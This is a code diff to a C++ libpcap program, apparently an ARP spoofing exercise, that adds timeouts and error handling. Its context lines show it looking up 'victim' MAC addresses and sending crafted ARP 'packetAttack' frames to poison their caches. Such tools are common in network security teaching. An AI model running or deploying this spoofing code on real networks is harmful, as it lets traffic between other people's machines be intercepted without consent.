@@ -26,10 +26,17 @@ Mac getTargetMac(pcap_t* handle, const char* victim_ip) {
 	struct pcap_pkthdr* header;
 	const u_char* packet;
 	int res;
+	time_t start_time = time(nullptr); // 시작 시간 기록
+
 	Ip victim_ip_obj(ntohl(inet_addr(victim_ip)));
 	while ((res = pcap_next_ex(handle, &header, &packet)) >= 0) {
-		if (res == 0) 
-			continue; // 타임아웃일 경우 계속 루프
+		if (res == 0) {
+			if (difftime(time(nullptr), start_time) > 10) { // 10초 경과 확인
+				cerr << "Timeout after 10 seconds while waiting for ARP reply." << endl;
+				return Mac(); // 타임아웃 시 빈 MAC 주소 반환
+			}
+			continue; // 타임아웃 발생 시 루프 계속
+		}
 		EthArpPacket* arp_reply = (EthArpPacket*)packet;
 		// 디버깅용 출력
 		//cout << "\nA: \n" << arp_reply->arp_.sip() << endl;
@@ -47,8 +54,10 @@ void GetMyIPAndMAC(const char* device){
 	char errbuf[PCAP_ERRBUF_SIZE];
 	uint32_t res = pcap_findalldevs(&alldevs, errbuf);
 	printf("Finding My IP and MAC address for device %s...\n", device);
-	if (res != 0)
+	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, errbuf);
+		exit(-1);
+	}
 	for (pcap_if_t* d = alldevs; d != NULL; d = d->next)
 		if (strcmp(d->name, device) == 0)
 			for (pcap_addr_t* a = d->addresses; a != NULL; a = a->next)
@@ -65,7 +74,7 @@ void GetMyIPAndMAC(const char* device){
 						printf("Failed to find MAC address.\n");
 						pcap_freealldevs(alldevs);
 						close(fd);
-						exit(0);
+						exit(-1);
 					}
 					uint8_t tmpmac[6];
 					for (uint32_t i = 0; i < 6; i++)
@@ -77,7 +86,7 @@ void GetMyIPAndMAC(const char* device){
 				}
 	printf("Failed to find IP address.\n");
 	pcap_freealldevs(alldevs);
-	exit(0);
+	exit(-1);
 }
 
 void usage() {
@@ -118,13 +127,13 @@ int main(int argc, char* argv[]) {
 	}
 	cout << "Program start..." << endl << endl<<endl;
 	GetMyIPAndMAC(dev);
-	std::cout << "MAC Address of My IP (" << string(myIpAddr)<< ") is ";
+	cout << "MAC Address of My IP (" << string(myIpAddr)<< ") is ";
 	printMacAddress(myMacAddr); // MAC 주소 출력
 	cout << endl;
 	cout << endl;
 	for (int i = 0; i < victim_ip.size(); i++) {
 		printf("finding MAC address for victim[%d] (%s)...\n", i+1,victim_ip[i]);
-		//std::cout << "\nC: \n" << myIpAddr << std::endl;
+		//cout << "\nC: \n" << myIpAddr << endl;
 		EthArpPacket packet;
 		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
 		packet.eth_.smac_ = myMacAddr;
@@ -139,15 +148,18 @@ int main(int argc, char* argv[]) {
 		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
 		packet.arp_.tip_ = htonl(Ip(victim_ip[i]));
 		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-		if (res != 0) 
+		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+			return -1;
+		}
 		// 응답 패킷 캡처 및 MAC 주소 추출
 		Mac victim_mac = getTargetMac(handle, victim_ip[i]);
 		if (victim_mac.isNull()) {
-			std::cerr << "Failed to get MAC address for " << victim_ip[i] << std::endl;
+			cerr << "Failed to get MAC address for " << victim_ip[i] << endl;
+			return -1;
 		}
 		else {
-			std::cout << "MAC Address of victim["<<i+1<<"] IP (" << victim_ip[i] << ") is ";
+			cout << "MAC Address of victim["<<i+1<<"] IP (" << victim_ip[i] << ") is ";
 			printMacAddress(victim_mac); // MAC 주소 출력
 			cout << endl;
 		}
@@ -168,8 +180,10 @@ int main(int argc, char* argv[]) {
 		packetAttack.arp_.tmac_ = victim_mac;
 		packetAttack.arp_.tip_ = htonl(Ip(victim_ip[i]));
 		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packetAttack), sizeof(EthArpPacket));
-		if (res != 0) 
+		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+			return -1;
+		}
 		cout << endl;
 	}
 	cout << endl;
